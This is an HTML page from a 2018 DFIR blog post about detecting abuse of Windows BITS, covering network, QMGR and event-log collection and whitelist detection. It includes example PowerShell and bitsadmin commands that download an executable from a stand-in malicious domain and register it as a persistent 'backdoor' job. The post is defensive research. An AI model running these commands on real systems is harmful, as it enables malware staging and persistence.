@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en-us"
+  dir="ltr">
+
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+
+
+
+<link rel="icon" type="image/ico" href="https://mgreen27.github.io//favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://mgreen27.github.io//favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://mgreen27.github.io//favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="192x192" href="https://mgreen27.github.io//android-chrome-192x192.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://mgreen27.github.io//apple-touch-icon.png">
+
+<meta name="description" content=""/>
+
+<title>
+    
+    Sharing my BITS | Matt&#39;s DFIR blog
+    
+</title>
+
+<link rel="canonical" href="https://mgreen27.github.io/posts/2018/sharing_my_bits/"/>
+
+<meta property="og:url" content="https://mgreen27.github.io/posts/2018/sharing_my_bits/">
+  <meta property="og:site_name" content="Matt&#39;s DFIR blog">
+  <meta property="og:title" content="Sharing my BITS">
+  <meta property="og:description" content="I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on download cradles and an interest in the client side forensics. I’m going to give a brief background, talk about some nuances in collection types and provide some background information when I was thinking about detection.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2018-02-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2018-02-18T00:00:00+00:00">
+    <meta property="article:tag" content="DFIR">
+    <meta property="article:tag" content="Powershell">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/assets/combined.min.186794b3399a702d3092949042cdc215dea303c17e71e7c0254768448de11db8.css" media="all">
+
+
+
+
+
+
+
+
+
+  </head>
+
+  
+
+  
+  
+  
+
+  <body class="auto">
+
+    <div class="content">
+      <header>
+        
+
+<div class="header">
+
+    
+
+    <h1 class="header-title">
+        <a href="https://mgreen27.github.io/">Matt&#39;s DFIR blog</a>
+    </h1>
+
+    <div class="flex">
+        
+
+        
+        
+      
+        <p class="small ">
+            <a href="/" >
+                /home
+            </a>
+        </p>
+        
+      
+        <p class="small ">
+            <a href="/posts" >
+                /posts
+            </a>
+        </p>
+        
+      
+        <p class="small ">
+            <a href="/about" >
+                /about
+            </a>
+        </p>
+        
+      
+        <p class="small ">
+            <a href="/projects" >
+                /projects &amp; presentations
+            </a>
+        </p>
+        
+        
+    </div>
+
+    
+
+</div>
+
+      </header>
+
+      <main class="main">
+        
+
+
+
+
+
+<div class="breadcrumbs">
+    
+    <a href="/">Home</a>
+    <span class="breadcrumbs-separator"> > </span>
+    
+    <a href="/posts/">Posts</a>
+    <span class="breadcrumbs-separator"> > </span>
+    
+    <a class="breadcrumbs-current" href="/posts/2018/sharing_my_bits/">Sharing my BITS</a>
+</div>
+
+
+
+<div >
+
+  <div class="single-intro-container">
+
+    
+
+    <h1 class="single-title">Sharing my BITS</h1>
+    
+    <p class="single-summary">I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on download cradles and an interest in the client side forensics. I’m going to give a brief background, talk about some nuances in collection types and provide some background information when I was thinking about detection.</p>
+    
+
+    
+
+    <p class="single-readtime">
+      
+      
+      
+      <time datetime="2018-02-18T00:00:00&#43;00:00">February 18, 2018</time>
+      
+
+      
+      &nbsp; · &nbsp;
+      6 min read
+      
+    </p>
+
+  </div>
+
+  
+
+  
+  
+
+  <div class="single-tags">
+    
+    <span>
+      <a href="https://mgreen27.github.io/tags/dfir/">#DFIR</a>
+    </span>
+    
+    
+    <span>
+      <a href="https://mgreen27.github.io/tags/powershell/">#Powershell</a>
+    </span>
+    
+    
+  </div>
+
+  
+  
+
+  
+
+  
+
+  
+
+  <div class="single-content">
+    <p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src="/posts/2018/sharing_my_bits/00title.png" width="380px" height="204px">
+    </div>
+
+    
+</figure>
+</p>
+<h3 class="heading" id="what-is-bits-and-why-do-we-care">
+  What is BITS and why do we care?
+  <a href="#what-is-bits-and-why-do-we-care">#</a>
+</h3>
+<p>Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. Part of all modern Windows systems from 2000+, the most well known use for BITS is Windows updates and other Windows transfer tasks.</p>
+<p>BITS has many interesting features including firewall whitelisted and proxy capable file transfer. BITS can also be configured on a schedule, with prioritisation or throttled transfer over idle network bandwidth. Additional &ldquo;evil friendly&rdquo; features are the ability to execute a command line option post job (persistence use case) and transfer policy. A newer feature is peer caching where subnet peer machines can be used as a cache for file downloads.</p>
+<p>In short that means BITS fits the profile as a candidate for attackers &ldquo;living off the land&rdquo;. Managed via a COM based API, Powershell or a built in binary (bitsadmin.exe), BITS can be used easily throughout the attack lifecycle.</p>
+<p>For those interested in digging further, I have included some detailed links on capabilities and configuration in my references below.</p>
+<h3 class="heading" id="artefact-creation">
+  Artefact creation
+  <a href="#artefact-creation">#</a>
+</h3>
+<p>Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># Bits download initiated via Powershell</span>
+</span></span><span style="display:flex;"><span>PS&gt; <span style="font-weight:bold;font-style:italic">Start-BitsTransfer</span> -Source <span style="color:#666;font-style:italic">&#34;http://www.totallylegitinappnews.com/mimi.jpg&#34;</span> -Destination <span style="color:#666;font-style:italic">&#34;c:\Windows\vss\mimi.exe&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"># Peristence via bitsadmin.exe</span>
+</span></span><span style="display:flex;"><span>CMD&gt; bitsadmin /create backdoor
+</span></span><span style="display:flex;"><span>CMD&gt; bitsadmin /addfile backdoor <span style="color:#666;font-style:italic">&#34;http://www.totallylegitinappnews.com/evil.exe&#34;</span>  <span style="color:#666;font-style:italic">&#34;c:\windows\VSS\evil.exe&#34;</span>
+</span></span><span style="display:flex;"><span>CMD&gt; bitsadmin /SetNotifyCmdLine backdoor c:\Windows\VSS\evil.exe NULL
+</span></span><span style="display:flex;"><span>CMD&gt; bitsadmin /resume backdoor
+</span></span></code></pre></div><p>I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.</p>
+<h3 class="heading" id="collection---network">
+  Collection - Network
+  <a href="#collection---network">#</a>
+</h3>
+<p>Network is by far the easiest collection point via typical web traffic filtering on user agent string and whitelisted domains. Although I have found everything from Windows, to application, to news traffic, with most BITS traffic is fairly static over time. I have found interesting use cases baselining current activity then spotting deviations from normal focusing on content, http method, destination and URL.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src="/posts/2018/sharing_my_bits/01pcap.png" width="964px" height="1202px">
+    </div>
+
+    
+</figure>
+</p>
+<p>Limitations in some environments are the obvious here: encrypted traffic. This method will also miss BITS setup with notification command line and not reaching out of the network.</p>
+<h3 class="heading" id="collection---endpoint">
+  Collection - Endpoint
+  <a href="#collection---endpoint">#</a>
+</h3>
+<p>Endpoint is by far the most detailed collection point, but generally the most difficult to master. I have broken out the endpoint into various sections to provide insights. &ldquo;Defending off the land&rdquo;, my goals are to find a lightweight collection capability to pull into a scripted solution without pre installation or change of audit policy. Unfortunately, that means probably the most valuable detection points: event monitoring via EDR, Sysmon and EventID 4688 (Process Creation + CLI) events are out, however some of the artefacts can be collected via EDR tools.</p>
+<h1 class="heading" id="bits-job-configuration">
+  Bits job configuration
+  <a href="#bits-job-configuration">#</a>
+</h1>
+<p>BITS can be configured and jobs reviewed using either Powershell command-lets or bitsadmin.exe. Limitations on this type of collection are: unless collected during the transfer, only scheduled jobs are available.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src="/posts/2018/sharing_my_bits/02powershell.png" width="1514px" height="1065px">
+    </div>
+
+    
+</figure>
+</p>
+<p>In my testing, both methods provide similar granular information on job details, however Bitsadmin does provide additional context. In my example below you can see additional configuration of the notification command line feature, also bypassing Autoruns detection.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src="/posts/2018/sharing_my_bits/03powershell.png" width="1396px" height="723px">
+    </div>
+
+    
+</figure>
+</p>
+<h1 class="heading" id="qmgr-database">
+  QMGR database
+  <a href="#qmgr-database">#</a>
+</h1>
+<p>Queue Manager queues store job specification and state. Typically located at: C:\ProgramData\Microsoft\Network\Downloader. For pre-Windows 10 systems, QMGR is stored in files named qmgr0.dat or qmgr1.dat.</p>
+<p>Limitations are: Microsoft has migrated to ESE database format for Queue Manager in Windows 10 and beyond leaving with a solution that would only work on some current systems.</p>
+<p>These are the files parsed by the ANSSI tool - bits_parser. Initially I toyed with the idea of a light weight binary parser in Powershell, to replicate bits_paser in non carving mode and roll in seperate capability for Windows 10.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src="/posts/2018/sharing_my_bits/04bitsparser.png" width="1193px" height="687px">
+    </div>
+
+    
+</figure>
+</p>
+<p>Results worked but led me to the second limitation: visibility is focused on scheduled or recent jobs. Thats is great for the BITS persistence use case but single BITS tasks can rotate out of the Queue Manager quickly and may not be recoverable even with carving. Assuming available data, I also found carving in Powershell was too resource intensive for a light weight collection so the preferred method would be to collect and parse offline if carving is required.</p>
+<p>Windows Event logs
+Focusing on default event logs, the best source for detection of malicious download is the Microsoft-Windows-Bits-Client/Operational log. These logs hold: state, source, user and some file information for each BITS transfer. This event log also appears to be similar across Windows 7 through 10 so fits the profile and a good endpoint collection source.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src="/posts/2018/sharing_my_bits/05eventlogs.png" width="1135px" height="707px">
+    </div>
+
+    
+</figure>
+</p>
+<p>Limitations include: sparse data, logs are spread over several EventIDs and potentially a lot of entries in a production environment making it difficult to spot evil hiding in the noise. This log will also not shed light on abuse of BITS for persistence unless there was a network transfer to a suspicious domain as part of the configured job.</p>
+<p>Writing a script to pull all EventID 59 events, highlighting some of the available information from the event: Time (converted to UTC), JobName and Source URL we can see the kind of noise to expect in a few hours activity.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="Parsing eventlogs for detection" src="/posts/2018/sharing_my_bits/06bitsdetectall.png" width="2133px" height="1103px">
+    </div>
+
+    
+</figure>
+</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center"><em>Parsing eventlogs for detection</em></td>
+      </tr>
+  </tbody>
+</table>
+<p>Following similar concepts to network based detection, I was able to build a whitelist for common domains from my network logs and whitelist out most of the noise potentially seen day to day.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src="/posts/2018/sharing_my_bits/07bitsdetect.png" width="1272px" height="1101px">
+    </div>
+
+    
+</figure>
+</p>
+<p>This method may be particularly helpful in environments that may have limitations on network encryption visibility. Some work is required to build out the whitelist with lots of outliers in a large network.</p>
+<p>My content is <a href="https://github.com/mgreen27/Invoke-BitsParser">available here</a>. Some of the other features I have added are:</p>
+<ul>
+<li>Configuration of days back to search (default 14).</li>
+<li>A switch (&quot;-All&quot;) to list all entries available in the logs to collect data to rejig whitelists from an endpoint view.</li>
+</ul>
+<h3 class="heading" id="final-thoughts">
+  Final Thoughts
+  <a href="#final-thoughts">#</a>
+</h3>
+<p>I couldn&rsquo;t finish this post without talking a little about capabilities all organisations should aspire to. Gold standard should be a mix of network and endpoint based visibility, with the ability to cover all gaps from each single source.</p>
+<p>Critical for a modern blue team, some of my recommendations are:</p>
+<ul>
+<li>Network based visibility around encrypted web traffic with content inspection.</li>
+<li>Process command line visibility on the endpoints to spot evil process chains and unusual command lines or obfuscation that is abnormal for the environment.</li>
+<li>Process module load visibility to spot unexpected functionality loaded.</li>
+<li>Process network activity to unexpected locations is also a good method to increase the scope of detection on the endpoint and provide additional context to network detections that may have visibility limitations.</li>
+<li>Spotting disk or registry write events out of normal activity and having context of associated process. Why is svchost.exe writing evil.exe to c:\Windows\VSS?</li>
+<li>Ability to execute adlib collections to answer questions of the environment.</li>
+<li>Upgrading to Powershell version 5 for Powershell script block visibility.</li>
+</ul>
+<p>I hope this post has provided some good food for thought and pointed anyone interested in the direction for further research and reference material. Feel free to reach out if you have any questions.</p>
+<h2 class="heading" id="references">
+  References
+  <a href="#references">#</a>
+</h2>
+<ol>
+<li>ANSSI. <a href="https://github.com/ANSSI-FR/bits_parser">Bits_Parser</a></li>
+<li>Azouri, Dor. <a href="https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/Dor%20Azouri/DEFCON-25-Dor-Azouri-BITSInject-WP.pdf">BITSInject</a></li>
+<li>Bohannon, Daniel. <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleCrafter</a></li>
+<li>Geiger,Matthew. <a href="https://www.dfrws.org/sites/default/files/session-files/pres-finding_your_naughty_bits.pdf">Finding Your Naughty BITS</a></li>
+<li>Hexacorn. <a href="http://www.hexacorn.com/blog/2017/07/12/beyond-good-ol-run-key-part-64/">Beyond Good Old RUn Key part 64</a></li>
+<li>Microsoft. <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753856(v=ws.11)">Bitsadmin documentation</a></li>
+<li>Microsoft. <a href="https://github.com/MicrosoftDocs/windows-powershell-docs/tree/master/docset/windows/bitstransfer">Powershell Bitstransfer documentation</a></li>
+<li>Microsoft. <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee663885(v=vs.85).aspx">Using Windows Powershell to create BITS Jobs</a></li>
+<li>O&rsquo;Day, Dan. <a href="https://github.com/danzek/annotationis/blob/master/Operating%20Systems/Windows/BITS.md">BITS annotationis</a></li>
+<li>Secureworks, Counter Threat Unit. <a href="https://www.secureworks.com/blog/malware-lingers-with-bits">Malware Lingers with BITS</a></li>
+</ol>
+
+    
+  </div>
+
+  
+
+
+  
+
+  
+  
+
+<div class="single-pagination">
+    <hr />
+
+    <div class="flex">
+
+        <div class="single-pagination-prev">
+            
+            <div class="single-pagination-container-prev">
+                <div class="single-pagination-text">←</div>
+                <div class="single-pagination-text">
+                    <a href="/posts/2018/invoke-liveresponse/">
+                        Invoke-LiveResponse
+                    </a>
+                </div>
+            </div>
+            
+        </div>
+
+        <div class="single-pagination-next">
+            
+            <div class="single-pagination-container-next">
+                <div class="single-pagination-text">
+                    <a href="/posts/2018/downloadcradle/">
+                        Powershell Download Cradles
+                    </a>
+                </div>
+                <div class="single-pagination-text">→</div>
+            </div>
+            
+        </div>
+
+    </div>
+
+    <hr />
+</div>
+
+
+
+  
+
+  
+
+  
+  <div class="back-to-top">
+    <a href="#top">
+      back to top
+    </a>
+  </div>
+  
+
+</div>
+
+
+      </main>
+    </div>
+
+    <footer>
+      
+
+    
+    <p>Powered by
+        <a href="https://gohugo.io/">Hugo</a>
+        and
+        <a href="https://github.com/tomfran/typo">tomfran/typo</a>
+    </p>
+    
+    
+    
+
+
+    </footer>
+
+    
+
+  </body>
+
+  <script>
+
+  function isAuto() {
+    return document.body.classList.contains("auto");
+  }
+
+  function setTheme() {
+    if (!isAuto()) {
+      return
+    }
+
+    document.body.classList.remove("auto");
+    let cls = "light";
+    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+      cls = "dark";
+    }
+
+    document.body.classList.add(cls);
+  }
+
+  function invertBody() {
+    document.body.classList.toggle("dark");
+    document.body.classList.toggle("light");
+  }
+
+  if (isAuto()) {
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(invertBody);
+  }
+
+  setTheme();
+
+</script>
+
+</html>
